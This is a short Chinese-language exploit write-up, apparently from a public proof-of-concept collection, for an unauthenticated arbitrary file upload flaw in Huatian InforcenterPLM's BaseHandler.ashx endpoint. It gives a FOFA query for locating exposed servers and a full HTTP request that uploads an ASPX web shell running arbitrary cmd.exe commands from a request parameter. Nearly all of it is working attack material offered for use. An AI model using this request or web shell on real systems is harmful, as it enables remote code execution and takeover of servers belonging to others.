## 华天InforcenterPLM-BaseHandler.ashx-任意文件上传漏洞

## 一、漏洞简介
华天InforcenterPLM BaseHandler.ashx 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
body="/Base/BaseHandler.ashx"
```

## POC
```
POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF GykZvnK06OXcbjq
Connection: close

------WebKitFormBoundaryF GykZvnK06OXcbjq
Content-Disposition: form-data; name="file"; filename="hello.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<%
if(Request["cmd"] != null){
    System.Diagnostics.Process process = new System.Diagnostics.Process();
    process.StartInfo.FileName = "cmd.exe";
    process.StartInfo.Arguments = "/c " + Request["cmd"];
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.Start();
    Response.Write(process.StandardOutput.ReadToEnd());
    process.Close();
}
%>

------WebKitFormBoundaryF GykZvnK06OXcbjq--
```
